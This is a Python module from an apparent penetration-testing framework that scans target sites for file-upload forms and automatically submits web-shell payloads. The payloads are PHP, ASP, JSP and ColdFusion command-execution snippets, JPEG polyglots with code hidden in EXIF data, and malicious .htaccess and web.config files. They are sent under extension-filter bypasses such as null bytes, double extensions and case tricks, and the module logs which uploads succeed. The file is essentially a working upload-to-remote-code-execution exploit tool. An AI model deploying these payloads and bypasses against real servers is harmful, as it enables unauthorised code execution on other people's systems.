"""
References:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
https://portswigger.net/web-security/file-upload
https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html
"""

import os
from urllib.parse import urlparse
import sys
import json
import base64
import requests
from requests_ratelimiter import LimiterSession
from typing import Optional
from bs4 import BeautifulSoup as bs

# Add the grandparent directory to sys.path
sys.path.append(
    os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
)

from modules.utils import logger, add_argument_if_not_exists, random_string
from modules.base_module import BaseModule, main

wappalyzer_map = {
    "php": ["php"],
    "asp": ["asp", ".net", "iis", "microsoft", "windows"],
    "jsp": ["java", "jsp", "tomcat", "servlet"],
    "cfm": ["coldfusion", "cfm", "lucee"],
    "apache": ["apache http server", "httpd"],
}

extensions = {
    "php": [
        "php",
        "phtml",
        "phar",
        "phpt",
        "pgif",
        "phtm",
        "inc",
        "jpg.php",
        "php%00.jpg",
        "php\x00.jpg",
        "pHp",
    ],
    "asp": [
        "asp",
        "aspx",
        "ashx",
        "asa",
        "asmx",
        "cer",
        "soap",
        "xamlx",
        "jpg.asp",
        "asp%00.jpg",
        "asp\x00.jpg",
        "aSp",
    ],
    "jsp": ["jsp", "jspx", "jpg.jsp", "jsp%00.jpg", "jsp\x00.jpg", "jSp"],
    "cfm": ["cfm", "cfml", "jpg.cfm", "cfm%00.jpg", "cfm\x00.jpg", "cFm"],
    "apache": [
        "htaccess",
        "jpg.htaccess",
        "htaccess%00.jpg",
        "htaccess\x00.jpg",
        "hTaccess",
    ],
    "iis": ["config", "jpg.config", "config%00.jpg", "config\x00.jpg", "cOnfig"],
}

payloads = {
    "php": [
        b"<?php system('whoami'); ?>",
        b"<?php echo shell_exec('whoami'); ?>",
        base64.b64decode("/9j/2wBDAAQDAwQDAwQEAwQFBAQFBgoHBgYGBg0JCgg=")
        + b"<?php system('whoami'); ?>",
        # JPEG image with exifdata artist set to '<?php system("whoami"); ?>'
        base64.b64decode(
            "/9j/4AAQSkZJRgABAQEASABIAAD//gAcPD9waHAgc3lzdGVtKCJ3aG9hbWkiKTsgPz7/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wAARCAABAAEDAREAAhEBAxEB/8QAFAABAAAAAAAAAAAAAAAAAAAAC//EABQQAQAAAAAAAAAAAAAAAAAAAAD/xAAUAQEAAAAAAAAAAAAAAAAAAAAA/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEQMRAD8AP/B//9k="
        ),
    ],
    "asp": [
        b'<% Response.Write CreateObject("WScript.Shell").Exec("whoami").StdOut.ReadAll() %>',
        base64.b64decode("/9j/2wBDAAQDAwQDAwQEAwQFBAQFBgoHBgYGBg0JCgg=")
        + b'<% Response.Write CreateObject("WScript.Shell").Exec("whoami").StdOut.ReadAll() %>',
        # JPEG image with exifdata artist set to '<% Response.Write CreateObject("WScript.Shell").Exec("whoami").StdOut.ReadAll() %>'
        base64.b64decode(
            "/9j/4AAQSkZJRgABAQEASABIAAD//gBUPCUgUmVzcG9uc2UuV3JpdGUgQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikuRXhlYygid2hvYW1pIikuU3RkT3V0LlJlYWRBbGwoKSAlPv/bAEMAAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAf/bAEMBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAf/AABEIAAEAAQMBEQACEQEDEQH/xAAUAAEAAAAAAAAAAAAAAAAAAAAL/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/EABQBAQAAAAAAAAAAAAAAAAAAAAD/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwA/8H//2Q=="
        ),
    ],
    "jsp": [
        b'<% Runtime.getRuntime().exec("whoami"); %>',
        base64.b64decode("/9j/2wBDAAQDAwQDAwQEAwQFBAQFBgoHBgYGBg0JCgg=")
        + b'<% Runtime.getRuntime().exec("whoami"); %>',
        # JPEG image with exifdata artist set to '<% Runtime.getRuntime().exec("whoami"); %>'
        base64.b64decode(
            "/9j/4AAQSkZJRgABAQEASABIAAD//gAsPCUgUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygid2hvYW1pIik7ICU+/9sAQwABAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEB/9sAQwEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEB/8AAEQgAAQABAwERAAIRAQMRAf/EABQAAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AD/wf//Z"
        ),
    ],
    "cfm": [
        b'<cfexecute name="whoami" variable="output">#output#</cfexecute>',
        base64.b64decode("/9j/2wBDAAQDAwQDAwQEAwQFBAQFBgoHBgYGBg0JCgg=")
        + b'<cfexecute name="whoami" variable="output">#output#</cfexecute>',
        # JPEG image with exifdata artist set to '<cfexecute name="whoami" variable="output">#output#</cfexecute>'
        base64.b64decode(
            "/9j/4AAQSkZJRgABAQEASABIAAD//gBBPGNmZXhlY3V0ZSBuYW1lPSJ3aG9hbWkiIHZhcmlhYmxlPSJvdXRwdXQiPiNvdXRwdXQjPC9jZmV4ZWN1dGU+/9sAQwABAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEB/9sAQwEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEB/8AAEQgAAQABAwERAAIRAQMRAf/EABQAAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AD/wf//Z"
        ),
    ],
    "apache": [
        b"AddType application/x-httpd-php .rce",
        b"""<Files ~ "^\.ht">
Order allow,deny
Allow from all
</Files>
AddType application/x-httpd-php .htaccess
#<?php system("whoami"); ?>""",
    ],
    "iis": [
        b"""<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<% Response.Write CreateObject("WScript.Shell").Exec("whoami").StdOut.ReadAll() %>"""
    ],
}

content_types = {
    "php": [
        "application/x-php",
        "image/jpeg",
        "text/html",
    ],
    "asp": [
        "application/x-asp",
        "image/jpeg",
        "text/html",
    ],
    "jsp": [
        "application/x-jsp",
        "image/jpeg",
        "text/html",
    ],
    "cfm": [
        "image/jpeg",
        "text/html",
    ],
    "apache": [
        "image/jpeg",
        "text/html",
    ],
}


class FileUploadModule(BaseModule):
    """A class to encapsulate File Upload vulnerability finding functionality."""

    name = "FileUpload"
    index = 65
    is_default_module = False
    description = "Check for file upload vulnerabilities"

    def __init__(self, args):
        """
        Initializes the File Upload class with the given parameters.

        :param args: The command line arguments passed to the script.
        """
        super().__init__(args)
        self.headers: Optional[str] = args.get("headers")

        self.success_codes = [200, 201, 202, 204, 301, 302, 303, 307, 308]

        self.input_file: str = os.path.join(self.output_dir, "nuclei-file-uploads.txt")
        self.wappalyzer_file: str = os.path.join(self.output_dir, "wappalyzer.json")

        self.output_file: str = os.path.join(self.output_dir, "file-uploads.txt")

    def pre(self) -> bool:
        """Checks preconditions before running the module."""
        if not os.path.exists(self.input_file):
            logger.critical(
                f"File Upload file {self.input_file} from Nuclei does not exist, exiting..."
            )
            return False

        if os.path.exists(self.output_file):
            logger.warning(
                f"File Upload file {self.output_file} already exists, overwriting..."
            )
            os.remove(self.output_file)

        if self.headers:
            k, v = self.headers.split(": ")
            self.headers = {k.strip(): v.strip()}
        if self.proxy:
            self.proxy = {"http": self.proxy, "https": self.proxy}

        return True

    def detect_tech(self):
        """Detects the technology used by the target using Wappalyzer output."""
        if os.path.exists(self.wappalyzer_file):
            with open(self.wappalyzer_file, "r") as f:
                wappalyzer = json.load(f)
                for tech in wappalyzer[list(wappalyzer)[0]].keys():
                    print(tech)
                    for key, values in wappalyzer_map.items():
                        for value in values:
                            if value in tech.lower():
                                logger.info(f"Detected technology: {key} in '{tech}'")
                                return key
        else:
            logger.warning(f"Wappalyzer file {self.wappalyzer_file} does not exist")
        logger.warning("No technology detected, defaulting to PHP")
        return "php"

    def run(self):
        """Runs the file upload vulnerability check."""
        requests.packages.urllib3.disable_warnings()  # Disable SSL warnings

        with open(self.input_file, "r") as f:
            s = LimiterSession(per_second=int(self.rate_limit))
            for url in f:
                early_exit = False
                url = url.strip()
                if not url:
                    continue
                try:
                    r = s.get(
                        url, headers=self.headers, proxies=self.proxy, verify=False
                    )
                except requests.RequestException as e:
                    logger.error(f"Error accessing {url}: {e}")
                    continue

                soup = bs(r.text, "html.parser")
                forms = soup.find_all("form")
                for form in forms:
                    if early_exit:
                        break
                    action = form.get("action")
                    method = form.get("method", "get").lower()
                    inputs = form.find_all("input")

                    # Check if the form has a file input
                    for input_tag in inputs:
                        if early_exit:
                            break
                        if input_tag.get("type") == "file":
                            # TODO: does not support multiple file inputs
                            logger.info(f"File upload form found: {url}")

                            tech = self.detect_tech()

                            for content_type in content_types[tech]:
                                if early_exit:
                                    break

                                for ext in extensions[tech]:
                                    if early_exit:
                                        break

                                    for payload in payloads[tech]:
                                        if early_exit:
                                            break

                                        test_file_name = f"{random_string()}.{ext}"
                                        files = {
                                            input_tag.get("name"): (
                                                test_file_name,
                                                payload,
                                                content_type,
                                            )
                                        }
                                        other_inputs = [
                                            other_input
                                            for other_input in inputs
                                            if other_input.get("type") != "file"
                                        ]
                                        data = {
                                            other_input.get("name"): (
                                                other_input.get("value")
                                                if other_input.get("value")
                                                else "x"
                                            )
                                            for other_input in other_inputs
                                        }

                                        parsed_url = urlparse(url)
                                        root = (
                                            parsed_url.scheme
                                            + "://"
                                            + parsed_url.netloc
                                        )
                                        if action.startswith("/"):
                                            target_url = root + action
                                        elif (
                                            action.startswith("http")
                                            and urlparse(action).netloc
                                            == urlparse(self.target).netloc
                                        ):
                                            target_url = action
                                        else:
                                            target_url = (
                                                parsed_url.scheme
                                                + "://"
                                                + parsed_url.netloc
                                                + parsed_url.path
                                                + action
                                            )

                                        resp = s.request(
                                            method,
                                            target_url,
                                            files=files,
                                            data=data,
                                            headers=self.headers,
                                            proxies=self.proxy,
                                            verify=False,
                                        )
                                        if (
                                            resp.status_code in self.success_codes
                                            and "not suc" not in resp.text.lower()
                                            and "error" not in resp.text.lower()
                                            and "failed" not in resp.text.lower()
                                        ):
                                            logger.info(
                                                f"File upload successful: {target_url} as {test_file_name} with content type {content_type} and payload (b64): {base64.b64encode(payload).decode()}"
                                            )
                                            logger.debug(f"Response: {resp.text}")
                                            with open(
                                                self.output_file, "a"
                                            ) as output_file:
                                                output_file.write(
                                                    f"{target_url} as {test_file_name} with content type {content_type} and payload (b64):\n{base64.b64encode(payload).decode()}\n"
                                                )
                                                output_file.write(
                                                    f"Response:\n{resp.text}"
                                                )
                                            early_exit = True

                if not early_exit:
                    logger.info(f"Did not find any vulnerabilities for {url}.")

    def post(self):
        return True


def add_arguments(parser):
    group = parser.add_argument_group("file-upload")
    add_argument_if_not_exists(group, "-H", "--headers", help="Headers to use")


if __name__ == "__main__":
    main("FileUpload", FileUploadModule, add_arguments)
